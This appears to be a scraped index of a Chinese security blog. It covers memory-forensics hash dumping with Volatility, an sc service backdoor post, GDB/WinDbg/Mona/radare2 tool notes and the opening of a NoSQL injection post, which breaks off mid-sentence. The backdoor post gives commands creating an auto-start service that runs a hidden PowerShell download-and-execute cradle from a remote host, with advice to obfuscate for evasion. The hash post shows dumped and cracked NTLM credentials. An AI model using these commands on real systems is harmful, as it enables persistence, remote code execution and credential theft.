Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_2341                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)                     AS Layer2 : FileAddressSpace (/Users/ssooking/Downloads/VMShare/TEST7-PC-20200117-042206.raw)                      PAE type : No PAE                           DTB : 0x187000L                          KDBG : 0xf8000402b120L          Number of Processors : 2     Image Type (Service Pack) : 1                KPCR for CPU 0 : 0xfffff8000402d000L                KPCR for CPU 1 : 0xfffff88004500000L             KUSER_SHARED_DATA : 0xfffff78000000000L           Image date and time : 2020-01-17 04:22:17 UTC+0000     Image local date and time : 2020-01-17 12:22:17 +0800\n\n\n\n接下来使用hivelist参数在内存中定位注册表配置单元的虚拟地址，以及磁盘上相应配置单元的完整路径：\n$ python vol.py --profile=Win7SP1x64 -f TEST7-PC-20200117-042206.raw hivelistVolatility Foundation Volatility Framework 2.6.1Virtual            Physical           Name------------------ ------------------ ----0xfffff8a0017f1010 0x000000005a79d010 \\??\\C:\\System Volume Information\\Syscache.hve0xfffff8a00525a010 0x0000000024c6b010 \\SystemRoot\\System32\\Config\\DEFAULT0xfffff8a006b50010 0x000000001f2aa010 \\SystemRoot\\System32\\Config\\SECURITY0xfffff8a00000d010 0x000000002c571010 \\REGISTRY\\MACHINE\\SYSTEM0xfffff8a00000f010 0x000000002c1d6010 [no name]0xfffff8a00006a010 0x000000002c027010 \\REGISTRY\\MACHINE\\HARDWARE0xfffff8a0009bc010 0x0000000029aaa010 \\Device\\HarddiskVolume1\\Boot\\BCD0xfffff8a0009e0010 0x0000000029cd7010 \\SystemRoot\\System32\\Config\\SOFTWARE0xfffff8a000c10010 0x0000000020c18010 \\SystemRoot\\System32\\Config\\SAM0xfffff8a000da8010 0x000000001cc88010 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT0xfffff8a000e35010 0x00000000541fe010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT0xfffff8a0013b7010 0x00000000094b8010 \\??\\C:\\Users\\Administrator\\ntuser.dat0xfffff8a001433410 0x0000000068714410 \\??\\C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat\n\n知识补充\n\n百度百科：\n注册表相当于Windows系统中所有32位硬件&#x2F;驱动和32位应用程序的数据文件，是一个系统信息的数据库。注册表文件在系统设置和缺省用户配置数据的情况下，存放在\\系统文件夹\\SYSTEM32\\CONFIG目录下的6个文件，DEFAULT、SAM、SECURITY、SOFTWARE、USERDIFF和SYSTEM中；\n用户的配置信息存放在系统所在磁盘的\\Documents and Setting\\目录，包括ntuser.dat，ntuser.ini和ntuser.dat.log。\n其中每个文件的路径都由注册表项HKLM\\SYSTEM\\CurrentControlSet\\Control\\Hivelist下的键值指出，通过读取hivelist键值内容可找到SAM密码哈希文件路径。\n\n找到SYSTEM和SAM的虚拟内存地址为：\n0xfffff8a00000d010 0x000000002c571010 \\REGISTRY\\MACHINE\\SYSTEM0xfffff8a000c10010 0x0000000020c18010 \\SystemRoot\\System32\\Config\\SAM\n\n\n\n从内存中获取hash：\n-y：SYSTEM的虚拟地址 \n-s：SAM配置单元的虚拟地址\n$ python vol.py --profile=Win7SP1x64 -f TEST7-PC-20200117-042206.raw hashdump -y 0xfffff8a00000d010 -s 0xfffff8a000c10010Volatility Foundation Volatility Framework 2.6.1Administrator:500:aad3b435b51404eeaad3b435b51404ee:afc44ee7351d61d00698796da06b1ebf:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Test7:1000:aad3b435b51404eeaad3b435b51404ee:afc44ee7351d61d00698796da06b1ebf:::\n\n\n\n获取到了LM:NTML hash格式的数据，解密NTML hash。下面可以尝试使用john或hashcat工具解密hash。\n在线解密平台Free Password Hash Cracker\nafc44ee7351d61d00698796da06b1ebf\tNTLM\ttoor\n\n\n\n虚拟机转储分析vmss2core是创建虚拟机的核心转储工具，如果该虚拟机已挂起 (.vmss) 或快照 (.vmsn) 检查点状态文件，可以使用Volatility工具解析这些文件以提取哈希转储。\n vmsnparser工具也是一个分析虚拟机转储的工具。详情参考VMware Snapshot and Saved State Analysis。\nReference\nI’ll Get Your Credentials … Later!\nhttps://nutcrackerssecurity.github.io/Forensics.html\n\n","categories":["神兵利器"],"tags":["Hash-Dumping","DumpIt"]},{"title":"后门自启动sc","url":"/2019/12/%E5%90%8E%E9%97%A8%E8%87%AA%E5%90%AF%E5%8A%A8sc/","content":"SC命令sc是Windows用于管理服务的命令，可以用于创建自启动服务后门。\n自启动木马服务注意binpath= xxx，等号后面有个空格，不然创建不成功\nsc create &quot;server power&quot; binpath= &quot;C:\\Users\\Administrator\\AppData\\Local\\Temp\\artifact.exe&quot;sc description &quot;server power&quot; &quot;description&quot;sc config &quot;server power&quot; start= autonet start &quot;server power&quot;\n\n\n\n自启动powershellsc create &quot;Windows Power&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.0.0.1:801/a&#x27;))\\&quot;&quot;sc description &quot;server power&quot; &quot;description&quot;sc config &quot;server power&quot; start= autonet start &quot;server power&quot;\n\n可以先对powershell命令进行混淆免杀。\n痕迹清理net start &quot;name&quot;    启动服务sc delete “name&quot;    删除服务\n\n","categories":["APT"],"tags":["后渗透","后门","权限维持"]},{"title":"GDB-Gef使用方法","url":"/2019/12/gdb-gef%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","content":"简介PEDA（Python Exploit Development Assistance for GDB）是一个强大的GDB插件。它提供了更多功能，如高亮显示反汇编代码、寄存器等信息。PEDA提供了一些实用新的命令，比如checksec、aslr等https://blog.csdn.net/SmalOSnail/article/details/53149426\n一键安装：\n安装GDB插件\nPeda: https://github.com/longld/peda\nGef: https://github.com/hugsy/gef\npwndgb：\n\npedagit clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit\n\n\n\ngef官方文档地址\nwget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.pyecho &quot;source ~/.gdbinit-gef.py&quot; &gt;&gt; ~/.gdbinit\n\n如果主机&#x2F;vm连接到互联网，你可以轻松地更新 GEF 到最新版本( 即使没有安装 git )。 \npython/path/to/gef.py --update$ python ~/.gdbinit-gef.py --updateUpdated\n\n如果没有可用的更新，GEF 将响应 No update。\ngef&gt; elf-info显示当前上下文和堆信息( MIPS )\n\n\n\n\n\nReferencehttps://www.kutu66.com/GitHub/article_126193\nhttp://www.peckerwood.top/post/peda_vs_pwndbg_gdb/\n","categories":["Reverse"],"tags":["GDB"]},{"title":"GDB-PEDA使用方法","url":"/2019/12/gdb-peda%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","content":"简介PEDA（Python Exploit Development Assistance for GDB）是一个强大的GDB插件。它提供了更多功能，如高亮显示反汇编代码、寄存器等信息。PEDA提供了一些实用新的命令，比如checksec、aslr等https://blog.csdn.net/SmalOSnail/article/details/53149426\n一键安装：\ngit clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinitwget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.pyecho &quot;source ~/.gdbinit-gef.py&quot; &gt;&gt; ~/.gdbinitgit clone https://github.com/scwuaptx/peda.git ~/pedagit clone https://github.com/scwuaptx/Pwngdb.git ~/Pwngdbcp ~/Pwngdb/.gdbinit ~/\n\n\n\n安装GDB插件\nPeda: https://github.com/longld/peda\nGef: https://github.com/hugsy/gef\npwndgb：\n\npedagit clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit\n\n\n\ngef官方文档地址\nwget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.pyecho &quot;source ~/.gdbinit-gef.py&quot; &gt;&gt; ~/.gdbinit\n\n\n\npwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbg &amp;&amp; sudo ./setup.shcd ..mv pwndbg ~/pwndbg-srcecho &quot;source ~/pwndbg-src/gdbinit.py&quot; &gt; ~/.gdbinit_pwndbg\n\n\n\n确认插件生效使用gdb -q xxx命令启动调试程序，出现类似字符串，说明已经成功安装\nGEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure75 commands loaded for GDB 7.11.1 using Python engine 3.5[*] 5 commands could not be loaded, run `gef missing` to know why.Reading symbols from execve...done.\n\n\n\n分别启用插件修改.gdbinit文件的内容为如下配置：\ndefine init-pedasource ~/peda/peda.pyenddocument init-pedaInitializes the PEDA (Python Exploit Development Assistant for GDB) frameworkenddefine init-gefsource ~/.gdbinit-gef.pyenddocument init-gefInitializes GEF (GDB Enhanced Features)enddefine init-pwndbgsource ~/.gdbinit_pwndbgenddocument init-pwndbgInitializes PwnDBGend\n\nAdditionally, create the following 3 files in your /usr/bin folder:\nFirst create /usr/bin/gdb-peda and paste the following:\n#!/bin/shexec gdb -q -ex init-peda &quot;$@&quot;\n\nThen /usr/bin/gdb-pwndbg\n#!/bin/shexec gdb -q -ex init-pwndbg &quot;$@&quot;\n\nAnd lastly, /usr/bin/gdb-gef\n#!/bin/shexec gdb -q -ex init-gef &quot;$@&quot;\n\n\n\n使用方法https://blog.csdn.net/gatieme/article/details/63254211\n","categories":["Reverse"],"tags":["GDB"]},{"title":"GDB调试基础","url":"/2019/12/gdb%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/","content":"GDB调试GDB即GUN Debugger，是linux上的标准调试器，常配合gef、peda等插件来使用。\n为方便调试，可以给gdb安装两个常用插件：gef和peda\n\ngef\npeda\n\n另外，推荐radware2和cutter调试工具。\n编译程序入门调试，本次调试一个简单的c程序，对程序运行过程中寄存器和栈的变化进行分析。c源码如下\n//test4.c#include &lt;stdio.h&gt;int add(int a, int b)&#123;    int result = a + b;    return result;&#125;int main()&#123;    int a = 10;    int b = 20;    char c = &#x27;L&#x27;;    float d = 2.33;    add(a, b);    return 0;&#125;\n\n 编译程序\ngcc hellogdb.c -o hellogdb \n\n\n\n汇编文件编译\n将汇编保存在一个名为max.s的文件中，并使用以下命令进行编译：\n$ as max.s -o max.o$ ld max.o -o max\n\n\n\n\n\n调试程序gdb ./filename\n\n使用gdb ./filename命令打开待调试文件，也可以进入gdb后使用file filename加载待调试文件。如果安装了GEF，将会显示gef&gt;提示符。\n根据二进制文件、核心文件或进程ID启动GDB：\n附加到一个进程：$ gdb -pid $（pidof &lt;process&gt;）\n调试二进制代码：$ gdb ./file\n$ gdb -q /path/to/my/bingef➤ gef help\n\n远程调试:\nremote:~ $ gdbserver 0.0.0.0:1234/path/to/fileRunning as PID: 666\n\n还有：\nlocal:~ $ gdb -qgef➤ gef-remote -t your.ip.address:1234 -p 666\n\n\n\n查看代码list 1,30\t\t//查看前30行代码\n\n注意，只有使用gcc -g参数编译的程序，才能在调试时看源代码。\n下断点让程序在指定函数如main、fread等处停下，以便调试。\ngef&gt; b maingef&gt; b *&lt;address&gt;   #在指定内存地址处停下\n\n其中指令 b 即 breakpoint 的缩写，与使用 breakpoint 效果一样；main 是指程序的main函数。即在main函数处下断点。下断点的方式有多种，使用起来也非常灵活。\n如果使用gcc -g参数编译的程序，在使用list xxx命令查看源码时，直接在某行代码处下断点。\n其他断点操作命令\ninfo breakdel &lt;number&gt;  （删除编号为x的断点） delete (删除所有断点） delete &lt;range&gt;（删除指定编号范围内的断点）break (or just b) &lt;function-name&gt;break &lt;line-number&gt;break filename:functionbreak filename:line-numberbreak *&lt;address&gt;break  +&lt;offset&gt;  break  –&lt;offset&gt;tbreak (设置一个临时断点） disable/enable &lt;breakpoint-number-or-range&gt; (不删除断点，只是启用/禁用它们） continue (or just c) – （继续执行，直到下一个断点） continue &lt;number&gt; (继续，但忽略当前断点指定次数。对循环内的断点非常有用） finish\t继续，直至函数末尾\n\n\n\n\n\n查看程序信息起始地址$ nm hellogdb | grep _start0804a018 B __bss_start0804a010 D __data_start0804a010 W data_start         w __gmon_start__08049f08 t __init_array_start         U __libc_start_main@@GLIBC_2.0080482e0 T _start\n\n\n\n(gdb) backtrace \t #查看函数调用的顺序(gdb) info args    #查看当前函数参数的值*\n\n\n\n\n\n寄存器信息info registers或i r命令检查寄存器的值 。\n内存信息examine 简写 x，以各种格式显示变量内容。 \n使用gdb&gt; help x命令来查看使用方式\n语法 : x/&lt;number&gt;&lt;format&gt;&lt;unit&gt;\n参数解释：\n\nnumber：要显示的内存单元个数\n\nformat：选择显示内容的格式，支持如下格式：\nt(binary)\t\t\t\t\t\t二进制o(octal)\t  \t\t\t\t八进制d(decimal)\t\t\t\t\t十进制x(hex)\t\t  \t\t\t\t十六进制a(address)\t\t\t\t\t内存地址c(char)\t\t\t\t\t\t\t字符形f(float)\t\t\t\t\t\t浮点数s(string)\t\t\t\t\t\t字符串i(instruction)\t\t\t指令形式u(unsigned decimal)\t无符号十进制\n\nunit：每个内存单元的大小，以字节计算\nb (byte)\t\t\t\t1 bytesh (half word)\t2 bytes w (word)\t\t\t\t4 bytesg (giant)\t\t\t8 bytes\n\n常用举例\ngef&gt; x/10i $sp\t\t\t当前栈gef&gt; x/16xw $pcgef&gt; x/16xw $espprint $buf\n\n\n\n\n\n查看反汇编代码disassemble命令可以查看函数的反汇编输出。 如查看main函数：disassemble main。\ngef➤  disassemble mainDump of assembler code for function main:   0x080483f1 &lt;+0&gt;:\tpush   ebp   0x080483f2 &lt;+1&gt;:\tmov    ebp,esp   0x080483f4 &lt;+3&gt;:\tsub    esp,0x10   0x080483f7 &lt;+6&gt;:\tmov    DWORD PTR [ebp-0xc],0xa   0x080483fe &lt;+13&gt;:\tmov    DWORD PTR [ebp-0x8],0x14   0x08048405 &lt;+20&gt;:\tmov    BYTE PTR [ebp-0xd],0x4c   0x08048409 &lt;+24&gt;:\tfld    DWORD PTR ds:0x80484b0   0x0804840f &lt;+30&gt;:\tfstp   DWORD PTR [ebp-0x4]   0x08048412 &lt;+33&gt;:\tpush   DWORD PTR [ebp-0x8]   0x08048415 &lt;+36&gt;:\tpush   DWORD PTR [ebp-0xc]   0x08048418 &lt;+39&gt;:\tcall   0x80483db &lt;add&gt;   0x0804841d &lt;+44&gt;:\tadd    esp,0x8   0x08048420 &lt;+47&gt;:\tmov    eax,0x0   0x08048425 &lt;+52&gt;:\tleave     0x08048426 &lt;+53&gt;:\tret    End of assembler dump.\n\n\n\nx&#x2F;i  反汇编 – 通常，我们会使用 x/10i $eip-20 来查看当前的汇编（$eip是指令寄存器）\n以16进制的形式打印当前程序中的变量tf里面的内容\n(gdb) p &#x2F;x *tf\n执行程序正常执行runrun 参数\n\n\n\nCrash执行run $(python -c &quot;A&quot;*27+)run $(python -c &#x27;print &quot; A&quot; *17 + &quot; \\x1b\\x84\\x04\\x08&quot; &#x27;)\n\n\n\n单步调试用于单步调试的命令：单步执行下一条命令。可以进入函数内部\nstepisstep &lt;number-of-steps-to-perform&gt;\n\n执行下一行代码。不会进入函数内部 \nnextinnext &lt;number&gt;\n\n继续处理，直到达到指定的行号、函数名称、地址、文件名函数或文件名：行号 \nuntiluntil &lt;line-number&gt;\n\n显示当前行号以及所在的函数：where\ngef&gt; nexti 5\n溢出测试$ ./bufferoverflow $(python -c &#x27;print &quot; A&quot; *17 + &quot; \\x1b\\x84\\x04\\x08&quot; &#x27;)\n\n文件型：\npython -c &#x27;print &quot; A&quot; *17 + &quot;\\x1b\\x84\\x04\\x08&quot;&#x27; &gt; input.txt\n\n\n\n\n\n命令速查二进制入门–动态跟踪源代码和反汇编代码\n#!bash--------terminal-----------gdbhelphelp datahelp stackhelp status-----------end-------------gdb stack0           #===&gt;gdb + file stack0l(list)              #show sourceb 7(break 7)         #add break on line7b 8(break 8)         #add break on line8b 11b 13b 15info b(info break)info registers       #show registersr(run)disas /m             /r      #show hex(显示汇编指令对应十六进制值)             /m      #show source if available(如果有源码，显示对应行源码)set disassembly-flavor att/intel     #设置att或intel格式set disassemble-next-line            #设置下一步是否显示汇编码si(setpi)                            #==&gt; step into,like f7 in odni(nexti)                            #==&gt; like f8 in odleave                #立即中断当前函数运行并返回，当前函数的剩余语句将不被执行finish               #执行到当前函数返回之后停止，当前函数的剩余语句将正常运行bt(backtrace)        #查看所有栈帧信息f num(frame num)     #选择并打印第num个栈帧信息info f(info frame)   #查看当前栈帧信息\n\n\n\nRefenencehttps://azeria-labs.com/debugging-with-gdb-introduction/\nhttps://www.cnblogs.com/HacTF/p/7773750.html\nhttps://bbs.pediy.com/thread-250772.htm\nhttp://www.cppblog.com/baby-fly/archive/2010/07/27/121395.html\n","categories":["Reverse"],"tags":["GDB"]},{"title":"Mona插件安装","url":"/2020/01/mona%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/","content":"前言Mona是\nPyKD- allows Python to be used to script WinDbg\nMona仅在WinDBG以及Immunity Debugger 1.83及更高版本上运行\n安装MonaWindbg一定要注意：如果使用32位windbg，则安装32位python；使用64位windbg，则安装64位python。\nWindbg  Preview 可以同时放32位和64位pykd.dll，但是如果调试32位程序，就要用32位python；如果调试64位程序，就要用64位python。\n1.安装Python 2.7.x (x86或者x64)，并配置环境变量。\n2.安装pykd\n安装python拓展插件pykd\n下载pykd_ext，把32位或者64位的pykd.dll复制到对应位数的windbg的winext目录。\n然后安装pykd库\npip install pykd\n\n或者直接在windbg的命令行模式下安装\n0:000&gt; !pip install --upgrade pykd\n\n\n\n2.管理员权限安装VC++运行库 (vcredist_x86.exe &amp; vcredist_x64.exe)   待测：不安装这个\n3.下载mona.py和windbglib.py，把这两个py文件到Windbg根目录下：\nC:\\Program Files(x86)\\Windows Kits\\10\\Debuggers\\x86\\C:\\Program Files(x86)\\Windows Kits\\10\\Debuggers\\x64\\\n\n\n\n5.测试mona是否运行正常\n0:000&gt; .load pykd0:000&gt; !py mona.py\n\n\n\n\n\n另一种安装pykd拓展的方法：下载pykd-xxx.whl，改后缀名为zip并解压。\n\n把pykd目录下的pykd.pyd文件复制到Windbg的winext目录下\n注册pykd目录下的msdia140.dll: regsvr32 msdia140.dll\n重复上面的操作3，把mona.py和windbglib.py复制到Windbg根目录下\n\n打开windbg，随便附加一个程序，command输入以下命令：\n0:000&gt; .load pykd.pyd0:000&gt; !py mona.py\n\n\n\n设置工作目录\n调试不同的程序时，mona命令的日志输出文件是相同的，导致新的日志输出会覆盖旧的，可以设置对不同程序的调试日志输出到不同目录。\n!py mona config -set workingfolder &quot;C:\\logs\\%p&quot;\n\n\n\n更新mona\n!py mona update\n\n\n\n报错\n0:000&gt; !py mona.py\n\n\n\nNOTE: PyKD v0.3.4.11 requires msdia120.dll, which only gets installed via Visual Studio 2013 (yup, I know) Alternatively, you can use the copy of msdia120.dll from the pykd.pyd file  (https://github.com/corelan/windbglib/raw/master/pykd/pykd03.zip), but use this file at your own risk\n\nFor PyKd v0.3.4.11:    Either install Visual Studio 2013, or get a copy of msdia120.dll and register it manually\nYou can find a copy of msdia120.dll inside the pykd.zip file inside the github repository(Use at your own risk!).  Place the file in the correct &#x27;VC&#x27; folder and run regsvr32 from an administrative prompt:  (x86) regsvr32.exe &quot;%ProgramFiles%\\Common Files\\microsoft shared\\VC\\msdia120.dll&quot;  (x64) regsvr32.exe &quot;%ProgramFiles(x86)%\\Common Files\\microsoft shared\\VC\\msdia120.dll&quot;\n\n\n\n\n\nImmunity Debugger1.安装32位的python2.7.x，并添加系统环境变量\n\n注意，这里只能安装32位的python，因为Immunity Debugger仅支持32位。\n\n2.把mona.py复制到Immunity Debugger的PyCommands目录\n3.测试mona\n执行!mona命令，此时会跳出日志窗口，显示mona命令的帮助。或者手动打开日志窗口(ALT-L)查看。\n设置工作目录\n!mona config -set workingfolder c:\\logs\\%p\n\n设置作者\n!mona config -set author corelanc0d3r\n\n\n\nhttps://connect.ed-diamond.com/MISC/MISC-079/Ramonage-de-vulns-avec-mona.py\n例如，这是贾斯汀·塞茨（Justin Seitz）撰写并由No Starch Press出版的出色的“ Gray Hat Python”脚本，进行了一些较小的修改，尤其是使其与最新版本的ImmunityDbg（1.85）兼容\nReferenceMona pykd.dll方式安装：https://arch-vile.com/?p=369\nWinDBG Configuration\nhttps://yan-1-20.github.io/2016/08/22/2016/8/22/\nmona基础安装及命令：https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/\n","categories":["Reverse"],"tags":["Windbg","Mona","Immunity Debugger"]},{"title":"Windbg主题使用","url":"/2020/01/windbg%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8/","content":"windbg themegithub下载theme，主题位置：\nC:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\themes\n\n\n\n.reg的主题直接双击导入\n.wew的\nwindbg.exe -Q -WF &quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\themes\\dark.wew&quot;windbg.exe -Q -WF &quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\themes\\Fixedsys4_dark.wew&quot;\n\n\n\n清除主题配置：\nreg delete HKCU\\Software\\Microsoft\\Windbg /f\n\n\n\n","categories":["Reverse"],"tags":["Windbg"]},{"title":"Windbg远程调试","url":"/2020/01/windbg%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/","content":"远程调试要求：两台主机上都安装了windgb，且网络能够互通。\n被调试机A首先在被调试机上运行服务\n方式一：WinDbg内开启服务器\n如果你已在被调试机上本地启动windbg调试某一程序，可以在windbg命令窗口中执行：\n.server tcp:port=6666\n\n\n\n方式二：使用dbgsrv.exe\ndbgsrv.exe -t tcp:port=6666\n\n\n\n调试机B在被调试机器上成功运行Server后，在调试机上打开Windbg，接着File→Connect to Remote Stub，输入\ntcp:Port=6666,Server=&lt;IP of Machine A&gt;\n\n这里需要设置适当的参数。\n你将看到File→Open Executable已无法选择，但你可以通过File→Attach to a process附加到进程 .这时可在机器A上看到进程列表。\n如果要在机器A停止服务器，可用Task Manager（任务管理器）接着kill dbgsrv.exe。\nReference使用 WinDbg 进行远程调试\nExploit开发系列教程-Windbg\n","categories":["Reverse"],"tags":["Windbg"]},{"title":"Windbg配置自动调试","url":"/2020/01/windbg%E9%85%8D%E7%BD%AE%E8%87%AA%E5%8A%A8%E8%B0%83%E8%AF%95/","content":"前言调试时，有时我们想在应用程序停止发生响应、崩溃、访问冲突、溢出等错误时，自动开启调试。Windbg提供了这个功能，用户可以在注册表中进行配置，当程序崩溃时系统会自动调用注册表中指定的调试器进行调试。\n配置自动调试1.打开注册表AeDebug，如果没有就创建这个项\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\n\n2.新建REG_SZ字符串，名字为Auto，值为0\n3.新建REG_SZ字符串，名字为Debugger，值为如下内容：\n&quot;C:\\Program Files\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe&quot; -p %ld -e %ld -g\n\n这里设置的就是调试器的路径和参数。\n嫌麻烦的可以把下面的内容保存为 AeDebug.reg文件，双击导入即可。\nWindows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug]&quot;UserDebuggerHotKey&quot;=dword:00000000&quot;Auto&quot;=&quot;0&quot;&quot;Debugger&quot;=&quot;\\&quot;C:\\\\Program Files\\\\Windows Kits\\\\10\\\\Debuggers\\\\x64\\\\windbg.exe\\&quot; -p %ld -e %ld -g&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\\AutoExclusionList]&quot;DWM.exe&quot;=dword:00000001\n\n\n\n\n\n开始自动调试调试时，先用命令行方式启动windgb.exe -IA作为自动调试器。\n运行windbg -I\nReferenceConfiguring Automatic Debugging\n启用事后调试\nSetup WinDbg to Catch Crash\n启用即时调试\n","categories":["Reverse"],"tags":["Windbg"]},{"title":"radare2入门","url":"/2020/01/radare2%E5%85%A5%E9%97%A8/","content":"介绍radare2是一款强大的开源命令行逆向工具，它可以反汇编、调试、分析和操作二进制文件。radare2与OD, IDA, Binary Ninja，Ghidra，hopper各有优点。\n安装radare2Radare2的开发非常快，该项目每天都在发展，因此建议在稳定版本上使用当前的git版本。有时稳定版本不如当前git版本稳定！\n$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh\n\n如果您不想安装git版本，或者想要编译好的（Windows，OS X，iOS等）的二进制文件，请查看radare2网站上的 下载页面。\n更新radare2强烈建议始终使用git存储库中的最新版本的r2。从git更新r2版本所需要做的就是执行：\n$ ./sys/install.sh\n\n使用方法r2 -h\n\n常用命令：\nr2 filename。然后执行以下命令：aaa–分析二进制文件afl–列出功能，确保可以识别main或sym.mainaf @ sym.main–分析main函数pdf @ sym.main–打印main函数V–进入可视模式space–在可视模式和图形模式之间切换\n获取程序基本信息rabin2允许从二进制文件中提取信息，包括节，标题（headers）、导入表、字符串、入口点等，并支持几种格式结果导出。rabin2能够解析许多文件格式，例如ELF，PE，Mach-O，Java CLASS。使用-I参数，显示二进制信息，例如操作系统，语言，字节序，体系结构，缓解措施（canary，pic，nx）等。\n$ rabin2 -I filename\n\n如果在radare2的交互式调试模式下，只需要输入i即可查看这些信息。\n调试程序使用如下命令启动并调试程序，会打印一些Tips信息，并且显示当前所在地址。\n$ r2 ./megabeets_0x1 -- There is no F5 key in radare2 yet[0x08048370]&gt; \n\n执行fo命令，你将得到一些彩蛋。\n查看帮助命令在终端输入?可获得功能命令的帮助。\n[0x08048370]&gt; ?\n\n在某个命令后添加?，可以获得其所有的子命令和相关命令。如i命令可查看程序信息，其实它是rabin2提供的功能，我们查看其所有字命令参数：\n[0x08048370]&gt; i?\n\n\n\n查看程序调试信息入口点[0x08048370]&gt; ie[Entrypoints]vaddr=0x08048370 paddr=0x00000370 haddr=0x00000018 hvaddr=0x08048018 type=program\n\n命令行模式下，可以直接使用 查看\n$ rabin2 -e filename\n\n\n\n分析程序a命令是一个分析程序的命令，它实际是r2 -A filename命令提供的功能。如\n[0x08048370]&gt; aaa  (aaaa)[x] Analyze all flags starting with sym. and entry0 (aa)[Cannot analyze at 0x08048360ac)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Check for objc references[x] Check for vtables[x] Type matching analysis for all functions (aaft)[x] Propagate noreturn information[x] Use -AA or aaaa to perform additional experimental analysis.\n\n\n\n查看字符串iz  ：在数据节中列出字符串izz ：在整个二进制文件中搜索字符串\n[0x08048370]&gt; iz[Strings]nth           paddr             vaddr        len size        section type                   string――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――7696581394432 0x804870000000000 0x1400000000 21  -2130595776 ascii   \\n  .:: Megabeets ::.  bin.strings7786775707649 0x804871500000000 0x1600000000 23  -2130595776 ascii   Think you can make it? bin.strings7885559955458 0x804872c00000000 0x900000000  10  -2130595776 ascii   Success!\\n             bin.strings7928509628419 0x804873600000000 0x1500000000 22  -2130595776 ascii   Nop, Wrong argument.\\n bin.strings\n\n命令行模式下，可以直接使用 查看\n$ rabin2 -z filename\n\n\n\n\n\nReference\nCutter, Scripting and Malware Analysis (Part 1, Part 2)\n\nReverse engineering a Gameboy ROM with radare2\n\nReversing a self-modifying binary with radare2\n\nIntroduction to Reverse Engineering and Radare2\n\n\n","categories":["Reverse"],"tags":["redare2"]},{"title":"NoSQL Injection","url":"/2020/07/nosql-injection/","content":"前言NoSQL (Not Only SQL)，非关系型数据库，适用于超大规模数据的存储，目前作为分布式云平台和 Web 应用程序的后端数据库越来越受欢迎。NoSQL 数据存储不像关系数据库那样将数据存储在表中，而是存储使用更适合于特定目的的其他数据模型，如文档、图表、对象等。\nNoSQL数据库不使用SQL通用查询语言。NoSQL查询语法是由应用程序的编程语言决定的：PHP、JavaScript、Python、Java 等。因此攻击者不仅可以在数据库中执行命令，还可以在应用程序本身中执行命令。\nMongoDB是目前最流行的NoSQL 数据库产品之一，它使用类似于 JSON（JavaScript Object Notation）的语法将数据存储为文档，还允许开发人员仅使用 JavaScript构建全栈应用程序。下面我们使用MongoDB查询来演示NoSQL注入攻击。\nMongoDB语法和操作符MongoDB语法和操作符可参考MongoDB 教程。条件操作符有：\n\n(&gt;)  大于 - $gt\n(&lt;) 小于 - $lt\n(&gt;&#x3D;) 大于等于 - $gte\n(&lt;&#x3D; )  小于等于 - $lte\n( !&#x3D; )  不等于 - $ne\n( &#x3D; )  等于 - $eq\n\n可能存在注入的位置\n认证表格\n过滤或搜索表单\n标题和cookie\n\n注入手法报错注入通过输入一些特殊的NoSQL字符，查看服务器是否返回错误，以此查看可能泄露的信息。报错信息可能暴露当前使用的是NoSQL数据库，或者类似500的错误。\n&#x27; &quot; \\ / $ [ ] . &gt; ; &#123; &#125; ( )\n\n测试方法：\n\n将特殊字符插入每个参数中观察是否发生错误\n用这些特殊字符或NoSQL关键字（如 $ne、$eq、$where、$or 等）替换已发布的 JSON 内容中的元素，观察是否有错误。\n发送附加对象以及有效的 JSON。如&#123;&quot;user&quot;: &quot;nullsweep&quot;&#125;可以改为&#123;&quot;user&quot;: [&quot;nullsweep&quot;, &quot;foo&quot;]&#125;或&#123;&quot;$or&quot;: [&#123;&quot;user&quot;: &quot;foo&quot;&#125;, &#123;&quot;user&quot;: &quot;realuser&quot;&#125;]&#125;\n\n其中一些字符或短语还可能触发其他注入漏洞（JS 注入、SQL 注入、shell 注入等），因此可能需要进一步测试以确保它是 NoSQL 